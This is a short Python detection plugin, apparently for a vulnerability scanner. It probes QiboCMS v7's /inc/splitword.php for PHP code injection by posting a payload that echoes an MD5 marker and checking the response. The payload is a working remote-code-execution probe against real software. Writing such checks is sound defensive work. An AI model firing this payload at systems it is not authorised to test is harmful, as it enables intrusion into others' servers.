# !usr/bin/dev python
# encoding : utf-8

import re
"""
desc:
QiboCMS v7 /inc/splitword.php 
reference:
http://www.wooyun.org/bugs/wooyun-2014-079582
&
http://www.beebeeto.com/pdb/poc-2014-0136/
"""


def assign(service, arg):
    if service == 'qibocms':
        return True, arg


def audit(arg):
    url = arg + 'inc/splitword.php'
    code, head, res, errcode, finalurl = curl.curl('-d Y2hlbmdzaGlzLmMjd=echo md5("testvul");' + url)
    if 'e87ebbaed6f97f26e222e030eddbad1c' in res:
        security_hole(url)
    pass

if __name__ == "__main__":
    from dummy import *
    audit(assign('qibocms', 'http://www.example.com/')[1])
